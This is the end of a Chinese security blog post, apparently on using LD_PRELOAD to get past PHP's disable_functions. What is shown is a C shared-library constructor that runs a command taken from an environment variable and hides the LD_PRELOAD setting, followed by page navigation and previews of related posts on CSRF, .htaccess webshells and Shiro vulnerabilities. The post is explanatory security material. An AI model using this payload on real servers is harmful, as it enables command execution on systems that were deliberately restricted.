+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="type">void</span> <span class="title">preload</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = <span class="built_in">getenv</span>(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    <span class="built_in">system</span>(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://991688344.github.io">LYC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://991688344.github.io/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/">http://991688344.github.io/2020/04/09/%E5%B7%A7%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://991688344.github.io" target="_blank">Rick</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a></div><div class="post-share"><div class="social-share" data-image="/images/Wallpaper/rainbowcat.gif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/04/09/Linux%E6%9F%A5%E6%89%BEPDF%E5%86%85%E5%AE%B9/" title="Linux查找PDF内容"><img class="cover" src="/images/Wallpaper/eatham.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Linux查找PDF内容</div></div><div class="info-2"><div class="info-item-1">  pdfgrep -R 'a pattern to search recursively from path' /some/path   find /path -name '*.pdf' -exec sh -c 'pdftotext &quot;&#123;&#125;&quot; - | grep --with-filename --label=&quot;&#123;&#125;&quot; --color &quot;your pattern&quot;' \; “ - ”是将pdftotext输出到stdout而不是文件的必要条件。pdftotext和grep选项将文件名放在grep的输出中。可选的pdfgrep标志很好，告诉grep使用终端上的颜色输出。 （在Ubuntu中，pdftotext由包grep或pdfgrep提供。）    https://www.itranslater.com/qa/details/2119607760756147200 </div></div></div></a><a class="pagination-related" href="/2020/04/09/LD-PRELOAD/" title="LD_PRELOAD"><img class="cover" src="/images/Wallpaper/eatham.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">LD_PRELOAD</div></div><div class="info-2"><div class="info-item-1">一、LD_PRELOAD是什么  LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime  linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。  二、程序调用流图  LA_PRELOAD替换前  LA_PRELOAD替换后   三、演示程序代码   主程序 1234567891011121314151617// myverifypasswd.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &quot;mystrcmp.h&quot; void main(int argc,char **argv) &#123;    char passwd[] =...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/03/27/CORS%E4%B8%8Ejsonp/" title="CORS与jsonp"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-27</div><div class="info-item-2">CORS与jsonp</div></div><div class="info-2"><div class="info-item-1">https://juejin.im/post/5cb5c40ff265da03a158210e </div></div></div></a><a class="pagination-related" href="/2020/02/25/CSRF%E6%BC%8F%E6%B4%9E/" title="CSRF漏洞"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-25</div><div class="info-item-2">CSRF漏洞</div></div><div class="info-2"><div class="info-item-1">什么是CSRF ​      CSRF（Cross-site request forgery）跨站请求伪造，也被称为“one click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 ​ ​      下图是一次完整的CSRF攻击示意图。用户登录并访问了一正常网站，登录成功后，网站返回用户的身份标识Cookie给用户。当用户访问到恶意网站时，恶意网站强制用户去向正常网站发送恶意请求。由于用户此时拥有正常网站的Cookie，所以就相当于攻击者盗用了用户身份，去访问了正常（目标）网站。 一次完整的CSRF攻击，需要受害用户需要完成两个步骤： ​       1.登录正常网站，并在本地生成Cookie。 ​ ​       2.在不退出正常网站的情况下，访问恶意网站。  CSRF 背景与介绍 CSRF（Cross Site Request...</div></div></div></a><a class="pagination-related" href="/2020/05/07/CTF%E4%B8%AD%E7%9A%84htaccess/" title="CTF中的htaccess"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-07</div><div class="info-item-2">CTF中的htaccess</div></div><div class="info-2"><div class="info-item-1">服务器中间件为apache，因此想到了传.htaceess来解析php，通常我们用 .htaccess来解析非php后缀文件时用到 AddType application/x-httpd-php .ppp 或者 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; auto_append_file和auto_prepend_file 相关bypass 如果文件末尾被自动加上一句话,会导致服务器500错误,这时候可以在最后添加#\ 将换行转义成普通字符 如果特殊字符被实体编码, 可以通过特殊编码来绕过   相关比赛 XNUCA2019Qualifier </div></div></div></a><a class="pagination-related" href="/2022/05/18/CVE-2019-12422_Shiro_Remember%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="CVE-2020-17523_Apache_Shiro身份认证绕过"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-18</div><div class="info-item-2">CVE-2020-17523_Apache_Shiro身份认证绕过</div></div><div class="info-2"><div class="info-item-1">CVE-2019-12422 漏洞描述 Shiro RememberMe 反序列化漏洞 漏洞成因 由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。 shiro对于Cookie处理做了如下实现： 123456789101112131415161718192021222324252627282930protected byte[] decrypt(byte[] encrypted) &#123;	byte[] serialized = encrypted;	CipherService cipherService = getCipherService();	if (cipherService != null) &#123;		ByteSource byteSource = cipherService.decrypt(encrypted,...</div></div></div></a><a class="pagination-related" href="/2022/05/18/CVE-2020-17523_Apache_Shiro%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" title="CVE-2020-17523_Apache_Shiro身份认证绕过"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-18</div><div class="info-item-2">CVE-2020-17523_Apache_Shiro身份认证绕过</div></div><div class="info-2"><div class="info-item-1">CVE-2020-17523 漏洞描述 Apache Shiro身份认证绕过漏洞 漏洞成因 Shiro中对于URL的获取及匹配在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain 先看下这个getChain方法： 12345678910111213141516171819202122232425262728293031323334353637public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123;        FilterChainManager filterChainManager = getFilterChainManager();        if (!filterChainManager.hasChains()) &#123;            return null;        &#125;     ...</div></div></div></a><a class="pagination-related" href="/2022/04/26/Cobalt-Strike%E4%BD%BF%E7%94%A8/" title="Cobalt Strike使用"><img class="cover" src="/2022/04/26/Cobalt-Strike%E4%BD%BF%E7%94%A8/cover.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-26</div><div class="info-item-2">Cobalt Strike使用</div></div><div class="info-2"><div class="info-item-1"> Cobalt Strike基础教程 Cobalt Strike使用教程一  https://zhuanlan.zhihu.com/p/359251293 </div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC80NzA1My8yMzU1Mw=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LYC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护"><img src="/images/Wallpaper/rainbowcat.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="4GPU服务器环境配置及维护"/></a><div class="content"><a class="title" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护">4GPU服务器环境配置及维护</a><time datetime="2023-08-29T12:00:26.000Z" title="发表于 2023-08-29 20:00:26">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="UEFI+systemd开机启动流程"/></a><div class="content"><a class="title" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程">UEFI+systemd开机启动流程</a><time datetime="2023-08-29T08:39:54.000Z" title="发表于 2023-08-29 16:39:54">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="udev配置Linux网络接口"/></a><div class="content"><a class="title" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口">udev配置Linux网络接口</a><time datetime="2023-08-27T12:49:29.000Z" title="发表于 2023-08-27 20:49:29">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="实验室服务器网络运维"/></a><div class="content"><a class="title" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维">实验室服务器网络运维</a><time datetime="2023-08-27T12:20:23.000Z" title="发表于 2023-08-27 20:20:23">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="Attention机制_transformer"/></a><div class="content"><a class="title" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer">Attention机制_transformer</a><time datetime="2022-11-21T11:55:15.000Z" title="发表于 2022-11-21 19:55:15">2022-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By LYC</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(async () => {
+  const showKatex = () => {
+    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
+  }
+
+  if (!window.katex_js_css) {
+    window.katex_js_css = true
+    await btf.getCSS('https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css')
+    if (true) {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js')
+    }
+  }
+
+  showKatex()
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+
+  const loadLivere = (el, path) => {
+    window.livereOptions = {
+      refer: path || location.pathname
+    }
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyLivere = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if (isShuoshuo) {
+    'Livere' === 'Livere'
+      ? window.shuoshuoComment = { loadComment: loadLivere }
+      : window.loadOtherComment = loadLivere
+    return
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
